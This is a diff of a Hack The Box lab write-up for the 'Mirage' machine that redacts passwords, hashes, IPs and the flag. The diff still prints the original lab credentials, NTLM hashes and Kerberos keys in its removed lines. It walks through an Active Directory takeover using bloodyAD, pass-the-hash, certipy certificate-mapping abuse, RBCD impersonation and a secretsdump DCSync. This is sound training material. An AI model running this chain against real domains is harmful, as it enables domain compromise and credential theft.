-Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
-Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
+Mirage-Service$:::<SNIP>
+Mirage-Service$:aes256-cts-hmac-sha1-96:<SNIP>
+Mirage-Service$:aes128-cts-hmac-sha1-96:<SNIP>
 ```
 
 Got the hash of `Mirage-Service$` account.
@@ -1724,7 +1724,7 @@ When got to this point, I got stuck for a while and I don't know how to continue
 &rarr; I try to get from information from `mark.bbond` and `Mirage-Service$` account.
 
 ```bash
-└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' get writable --detail                      
+└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@xxxxx' get writable --detail                      
 
 distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
 url: WRITE
@@ -2002,7 +2002,7 @@ It returns `1` which means that it controls Kerberos PKINIT authentication on DC
 First let's generate back again the ticket from `Mirage-Service$` account.
 
 ```bash
-└─$ getTGT.py mirage.htb/Mirage-Service\$ -hashes :305806d84f7c1be93a07aaf40f0c7866 -dc-ip 10.129.254.128
+└─$ getTGT.py mirage.htb/Mirage-Service\$ -hashes :<SNIP> -dc-ip 10.129.xx.xx
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in Mirage-Service$.ccache
@@ -2019,7 +2019,7 @@ Then we will certificate abuse by udpate `altSecurityIdentities` attribute.
 -target dc01.mirage.htb \
 -upn 'dc01$@mirage.htb' \
 -user 'mark.bbond' update \
--dc-ip 10.129.254.128
+-dc-ip 10.129.xx.xx
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'mark.bbond':
@@ -2061,7 +2061,7 @@ Now update `altSecurityIdentities` attribute again with `Mirage-Service$` accoun
 -target dc01.mirage.htb \
 -upn 'mark.bbond@mirage.htb' \
 -user 'mark.bbond' update \
--dc-ip 10.129.254.128
+-dc-ip 10.129.xx.xx
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'mark.bbond':
@@ -2072,14 +2072,14 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 Let's authenticate with certificate.
 
 ```bash
-└─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.254.128 -ldap-shell      
+└─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.xx.xx -ldap-shell      
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
 [*]     SAN UPN: 'dc01$@mirage.htb'
 [*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
-[*] Connecting to 'ldaps://10.129.254.128:636'
-[*] Authenticated to '10.129.254.128' as: 'u:MIRAGE\\DC01$'
+[*] Connecting to 'ldaps://10.129.xx.xx:636'
+[*] Authenticated to '10.129.xx.xx' as: 'u:MIRAGE\\DC01$'
 Type help for list of commands
 
 # whoami
@@ -2110,7 +2110,7 @@ For this part, you can just try `bloodhound-python` to collect the data and then
 I will try this [RustHound](https://github.com/NH-RED-TEAM/RustHound) to see if we can collect more data.
 
 ```bash
-└─$ ./RustHound/target/x86_64-unknown-linux-gnu/release/rusthound -d mirage.htb -f dc01.mirage.htb -u nathan.aadam -p '3edc#EDC3' -k --old-bloodhound --adcs --zip -o ~/HTB_Labs/DEPTHS_Season8/Mirage/nathan/mirage_results.zip
+└─$ ./RustHound/target/x86_64-unknown-linux-gnu/release/rusthound -d mirage.htb -f dc01.mirage.htb -u nathan.aadam -p '3edc#xxxx' -k --old-bloodhound --adcs --zip -o ~/HTB_Labs/DEPTHS_Season8/Mirage/nathan/mirage_results.zip
 ---------------------------------------------------
 Initializing RustHound at 12:30:32 on 07/22/25
 Powered by g0h4n from OpenCyber
@@ -2152,7 +2152,7 @@ So we can see that `mark.bbond` has **AllowedToAct** over `DC01` account.
 And also `DC01` has **[CoerceToTGT](https://bloodhound.specterops.io/resources/edges/coerce-to-tgt)** over `Mirage.htb` domain which we can **DCSync** with `secretsdump.py`.
 
 ```bash
-└─$ getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/mark.bbond:1day@atime' -k
+└─$ getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/mark.bbond:1day@xxxxx' -k
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Impersonating DC01$
@@ -2186,7 +2186,7 @@ Then we will back again the environment to `nathan.aadam` account and use [getST
 ```bash
 └─$ export KRB5CCNAME=nathan.aadam.ccache 
 
-└─$ getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k
+└─$ getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#xxxx' -k
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Impersonating DC01$
@@ -2214,59 +2214,20 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
-mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
-mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
-mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
-mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
-mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
-mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
-mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
-Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
+mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
+<SNIP>
 [*] Kerberos keys grabbed
-mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
-mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
-mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
-krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
-krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
-krbtgt:des-cbc-md5:8cd65e54d343ba25
-mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
-mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
-mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
-mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
-mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
-mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
-mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
-mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
-mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
-mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
-mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
-mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
-mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
-mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
-mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
-mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
-mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
-mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
-mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
-mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
-mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
-DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
-DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
-DC01$:des-cbc-md5:cb19ce2c733b3ba8
-Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
-Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
-Mirage-Service$:des-cbc-md5:c42ffd455b91f208
+mirage.htb\Administrator:aes256-cts-hmac-sha1-96:<SNIP>
+mirage.htb\Administrator:aes128-cts-hmac-sha1-96:<SNIP>
+mirage.htb\Administrator:des-cbc-md5:<SNIP>
+<SNIP>
 [*] Cleaning up...
 ```
 
 Got the hashes of `Administrator` account. Let's grab the ticket from `Administrator` account and update the `KRB5CCNAME`.
 
 ```bash
-└─$ getTGT.py -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip 10.129.254.128 mirage.htb/Administrator
+└─$ getTGT.py -hashes :<SNIP> -dc-ip 10.129.xx.xx mirage.htb/Administrator
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in Administrator.ccache
@@ -2299,7 +2260,7 @@ Mode                 LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-bf797d485a0b63a55faa5362c7674911
+bf797dxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `root.txt` flag.
